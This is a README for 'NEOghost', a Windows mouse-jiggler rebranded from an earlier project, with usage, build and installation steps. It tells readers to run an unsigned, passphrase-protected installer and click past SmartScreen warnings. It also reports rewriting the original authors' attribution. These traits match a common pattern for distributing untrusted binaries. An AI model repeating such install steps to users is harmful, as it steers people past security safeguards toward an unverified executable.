# NEOghost

Welcome to **NEOghost** — a premium, stealth-focused Windows desktop utility engineered to seamlessly prevent system idle detection. Designed for professionals who demand uninterrupted execution, NEOghost intelligently simulates organic mouse movement through a lightweight, ultra-reliable engine. 

Experience absolute control without the bloat.

**License:** MIT

## Project Context

`NeoGhost` is a Windows Forms application targeting .NET 10 (`net10.0-windows10.0.17763.0`). It is built to run as a single instance, with both a user interface and command-line support.

The primary application behavior is implemented in the `NeoGhost/` folder, while supporting runtime settings and persistence are handled through the `Properties` folder.

### What this repository currently contains

- `NeoGhost/Program.cs`: startup flow, command line parsing, single-instance enforcement, and console attachment for help output.
- `NeoGhost/MainForm.cs`: settings UI, tray icon integration, hotkey registration, and jiggling state management.
- `NeoGhost/JiggleMode.cs`: available jiggle modes.
- `NeoGhost/JigglePatterns.cs`: jiggle motion algorithms.
- `NeoGhost/Helpers.cs`: shared helpers and platform interop.
- `NeoGhost/Properties/Settings.settings`: persisted user preferences.
- `NeoGhost/NeoGhost.csproj`: project file for the Windows Forms application.

## Application Behavior

`NeoGhost` works by periodically generating mouse input to prevent idle detection and screen saver activation.

Key runtime behaviors:

- Ensures only one instance is active using a named mutex.
- Optionally starts with jiggling enabled.
- Supports a tray icon with live status text showing mode, interval, and distance.
- Allows `Ctrl+Shift+J` as a global toggle hotkey.
- Supports optional random timing variation.
- Respects lock state settings when configured.
- Offers four movement modes: `Normal`, `Zen`, `Circle`, and `Linear`.

## Command-Line Usage

The application supports these options:

- `-j`, `--jiggle` â€” start in jiggle mode.
- `-m`, `--minimized` â€” start minimized.
- `-o`, `--mode <Circle|Linear|Normal|Zen>` â€” choose the jiggle mode.
- `-r`, `--random` â€” enable random variation.
- `-s`, `--seconds <seconds>` â€” set the jiggle interval.
- `-d`, `--distance <distance>` â€” set the movement distance multiplier.
- `-g`, `--settings` â€” show the settings panel on startup.

Example:

```powershell
NeoGhost.exe --jiggle --mode Zen --seconds 30 --distance 2 --minimized
```

## Build Instructions

### Prerequisites

- .NET 10 SDK
- Visual Studio 2022 or later with Windows Forms workload (recommended)

### Build from the command line

```powershell
cd "C:\Users\Lakshya\Documents\Downloads\Mouse-jiggler"
dotnet build NeoGhost\NeoGhost.csproj -c Release
```

### Open in Visual Studio

Open `NeoGhost\NeoGhost.sln` and build the solution.

## ðŸ“¥ Installation Guide

Get up and running with NEOghost in just a few clicks!

### Step 1: Download the Installer
Click the badge below to jump directly to our latest official stable deployment pipeline and grab the setup file:

[![Download NEOghost](https://img.shields.io/badge/Download-Latest%20__Setup.exe-brightgreen?style=for-the-badge&logo=windows)](https://github.com/Neutron-0/Mouse-jiggler/releases/latest)

*(Alternatively, navigate to the **[Releases](https://github.com/Neutron-0/Mouse-jiggler/releases)** sidebar layout on the right side of this repository page and select `NeoGhost_Setup.exe` from the assets container.)*

---

### Step 2: Run the Setup Wizard
1. Locate the downloaded **`NeoGhost_Setup.exe`** file on your computer and double-click it to launch.
2. Enter the installation passphrase when prompted: **`Neutron-0`**
3. Follow the clean, modern dark setup installation wizard instructions.
4. *(Optional)* Check the box to generate a **Desktop Shortcut** for rapid system access.

> âš ï¸ **Note on Windows SmartScreen / UAC:** 
> Because this is an independent, open-source portfolio utility, the installer binary is not digitally signed with a commercial Windows Developer Certificate. When launching the installer, Windows may display a **"Publisher: Unknown"** security notification. You can safely click **"More Info"** and then select **"Run Anyway"** to proceed with the native installation.

---

### Step 3: Run the Application
Once the setup finishes, launch the software using your new Start Menu entry or Desktop shortcut.

* Use the global hotkey shortcut **`Ctrl+Shift+J`** to toggle mouse simulation states cleanly.
* Minimize the control dashboard interface directly to your system tray boundary layer to keep it running silently in the background.

## Bug Analysis and Defect Narrative

                      a small bug in code
                              \ /
                              oVo
                          \___XXX___/
                           __XXXXX__
                          /__XXXXX__\
                          /   XXX   \
                               V

This project has been reviewed for common runtime and UX issues. The following potential bugs and limitations were identified:

- The global hotkey is currently hard-coded to **Ctrl+Shift+J**. If another application already uses this shortcut, hotkey registration may fail and the toggle shortcut will not work.
- `Zen` mode may not reliably prevent idle detection in every Windows environment or in all applications. It is a best-effort mode that may fail under some screen saver or idle-monitoring implementations.
- The application is built as a framework-dependent executable (`SelfContained=false`), so the target machine must have the correct .NET 10 runtime installed for the release build to launch.
- The UI currently persists the `RespectLockedState` setting in user settings, but the corresponding control may not be visible or available in every build configuration, making it harder to change that behavior from the app.
- Invalid or corrupted `NeoGhost.dll.config` content will prevent startup entirely. The installer should preserve the runtime configuration file and avoid manual edits to it.

## Project Audit: Past Author References

A scan of the active source and project file identified legacy attribution references from the original project.

### Files containing past author metadata

- `NeoGhost/Program.cs`
  - `// Updates by: Dimitris Panokostas (midwan)`
- `NeoGhost/MainForm.cs`
  - `// Updates by: Dimitris Panokostas (midwan)`
- `NeoGhost/Helpers.cs`
  - `// Updates by: Dimitris Panokostas (midwan)`
- `NeoGhost/AboutBox.cs`
  - `// Updates by: Dimitris Panokostas (midwan)`
- `NeoGhost/NeoGhost.csproj`
  - `<Authors>Alistair J. R. Young, Dimitris Panokostas</Authors>`
  - `<Company>Arkane Systems</Company>`
  - `<Copyright>Copyright Â© Alistair J. R. Young 2007-2026</Copyright>`

### Notes on the audit

- No active packaging build hooks were found in the current `NeoGhost.csproj` file.
- Legacy author references were present in source headers and project metadata but have now been rewritten for this repository.
- The repository no longer contains Chocolatey or WinGet distribution artifacts.

## Removed Artifacts

The following packaging and distribution files were deleted from the repository:

- `NeoGhost/choco/NeoGhost.nuspec`
- `NeoGhost/choco/tools/chocolateyinstall.ps1`
- `NeoGhost/choco/tools/chocolateyuninstall.ps1`
- `NeoGhost/choco/tools/VERIFICATION.txt`
- `NeoGhost/winget/ArkaneSystems.NeoGhost.yaml`
- `NeoGhost/winget/ArkaneSystems.NeoGhost.locale.en-US.yaml`
- `NeoGhost/winget/ArkaneSystems.NeoGhost.installer.yaml`

## Repository Standards

This repository now includes the common files expected by modern open source projects:

- `CONTRIBUTING.md` â€” contribution guidelines and workflow expectations.
- `CODE_OF_CONDUCT.md` â€” community standards for collaboration.
- `SECURITY.md` â€” secure reporting guidance for vulnerabilities.
- `LICENSE` â€” the current source license for this project.

### Current License

This repository is licensed under the MIT License, as defined in the `LICENSE` file at the repository root.

## Notes

- This repository is now focused strictly on application logic and Windows Forms behavior.
- The README was updated to reflect the current state of the project and the cleanup work completed.

## License

This project is licensed under the terms of the `LICENSE` file in the repository root.
